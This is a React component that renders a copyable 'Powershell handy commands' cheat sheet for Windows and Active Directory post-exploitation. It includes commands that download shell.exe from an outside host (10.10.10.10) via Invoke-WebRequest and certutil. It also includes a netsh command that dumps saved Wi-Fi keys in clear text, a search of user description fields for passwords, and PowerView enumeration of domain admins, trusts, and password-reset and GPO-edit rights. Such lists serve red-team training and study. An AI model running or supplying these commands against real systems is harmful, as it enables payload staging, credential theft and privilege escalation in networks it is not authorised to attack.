import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph, Text } = Typography;

export default (props) => {
	const local_sys_enum = [
		{ title: 'systeminfo' },
		{ title: 'Get-WmiObject Win32_ComputerSystem' },
		{ title: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' }
	];
	const lastpatchlist = 'Get-Hotfix -description "Security update"';
	const lastpatchlist_wmic = 'wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn';
	const envVar = 'Get-ChildItem Env: | ft Key,Value';
	const envVar_cmd = 'set';
	const wlan_creddump = [
		{ title: 'netsh wlan show profiles' },
		{ title: 'netsh wlan show profile name="PROFILE-NAME" key=clear' }
	];

	// windows wget like
	const powershell_http_dl = ' Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
	const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';

	// domain enum
	const domain_name = `Get-NetDomain`;
	const forest_domain_list = `Get-NetForestDomain`;
	const domain_SID = `Get-DomainSID `;
	const domain_Policy = `Get-DomainPolicy`;
	const domain_OUs = `Get-NetOU`;
	const domain_trust = `Get-NetDomainTrust`;
	// gpo
	const gpo_enum = `Get-NetGPO -ComputerName computername.domain.com`;
	// passwd enum
	const passwd_lastset = `Get-UserProperty –Properties pwdlastset`;
	const user_desc_harvest = `Find-UserField -SearchField Description –SearchTerm “pass”`;

	//computers domain
	const domain_computers = `Get-NetComputer`;
	const domain_pingable_computers = `Get-NetComputer -Ping`;
	const domain_win7U_computers = `Get-NetComputer –OperatingSystem "Windows 7 Ultimate"`;

	//domain admins
	const domain_admin_members = `Get-NetGroupMember -GroupName "Domain Admins"`;
	const domain_admins_groups = `Get-NetGroup *admin*`;
	const local_admins = `Get-NetLocalGroup –ComputerName PCNAME-001`;
	const user_group_membership = `Get-NetGroup –UserName "username"`;

	//acl
	const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
	const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
	const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;

	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				Powershell handy commands
			</Title>
			<Paragraph style={{ margin: 15 }}>List of useful Powershell commands</Paragraph>
			<Divider dashed />
			<div
				key='a'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>System enumeration</Title>
				{local_sys_enum.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
				<Text strong># List Security patches</Text>
				<Paragraph copyable ellipsis={true}>
					{lastpatchlist}
				</Paragraph>
				<Paragraph copyable ellipsis={true}>
					{lastpatchlist_wmic}
				</Paragraph>
				<Text strong># Environment Variables</Text>
				<Paragraph copyable ellipsis={true}>
					{envVar}
				</Paragraph>
				<Text strong> (over cmd.exe) </Text>
				<Paragraph copyable ellipsis={true}>
					{envVar_cmd}
				</Paragraph>
				<Divider dashed />
				<Title level={4}>HTTP download (wget like)</Title>
				<Paragraph copyable ellipsis={true}>
					{powershell_http_dl}
				</Paragraph>
				<Text strong># Cmd compatible</Text>
				<Paragraph copyable ellipsis={true}>
					{cmd_cert_http_dl}
				</Paragraph>
				<Divider dashed />
				<Title level={4}>WLAN enumeration</Title>
				{wlan_creddump.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>

			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15
				}}
			>
				<Title level={2}>Active Directory enumeration</Title>

				<Title level={4}>Domain enumeration</Title>

				<Paragraph copyable ellipsis={true}>
					{domain_name}
				</Paragraph>

				<Text strong># List Forest Domains </Text>
				<Paragraph copyable ellipsis={true}>
					{forest_domain_list}
				</Paragraph>

				<Text strong># Domain SID </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_SID}
				</Paragraph>

				<Text strong># Domain Policy </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_Policy}
				</Paragraph>

				<Text strong># Domain Organizational Units </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_OUs}
				</Paragraph>

				<Text strong># List trusted Domains</Text>
				<Paragraph copyable ellipsis={true}>
					{domain_trust}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> GPO enumeration</Title>

				<Text strong># GPO applied to the machine</Text>
				<Paragraph copyable ellipsis={true}>
					{gpo_enum}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> Password enumeration</Title>

				<Text strong># Last Password Set date</Text>
				<Paragraph copyable ellipsis={true}>
					{passwd_lastset}
				</Paragraph>
				<Text strong># Description of User object </Text>
				<Paragraph copyable ellipsis={true}>
					{user_desc_harvest}
				</Paragraph>
				<Divider dashed />

				<Title level={4}> Computer enumeration</Title>

				<Text strong># List Computers of the Domain</Text>
				<Paragraph copyable ellipsis={true}>
					{domain_computers}
				</Paragraph>
				<Text strong># List Pingable Hosts </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_pingable_computers}
				</Paragraph>
				<Text strong># List Windows 7 Ultimate Computers </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_win7U_computers}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> Admin groups and account enumeration</Title>

				<Text strong># List Domain Admin members</Text>
				<Paragraph copyable ellipsis={true}>
					{domain_admin_members}
				</Paragraph>
				<Text strong># List Admin Groups </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_admins_groups}
				</Paragraph>
				<Text strong># List Local Admins [need Administrative rights] </Text>
				<Paragraph copyable ellipsis={true}>
					{local_admins}
				</Paragraph>

				<Text strong># Get groups of user [need Administrative rights] </Text>
				<Paragraph copyable ellipsis={true}>
					{user_group_membership}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> ACL enumeration</Title>

				<Text strong># User ACL </Text>
				<Paragraph copyable ellipsis={true}>
					{ACL_user_enum}
				</Paragraph>

				<Text strong># GPO modifications rights</Text>
				<Paragraph copyable ellipsis={true}>
					{ACL_gpoedit_rights}
				</Paragraph>

				<Text strong># Password reset rights</Text>
				<Paragraph copyable ellipsis={true}>
					{ACL_passwd_edit_rights}
				</Paragraph>
			</div>
		</QueueAnim>
	);
};
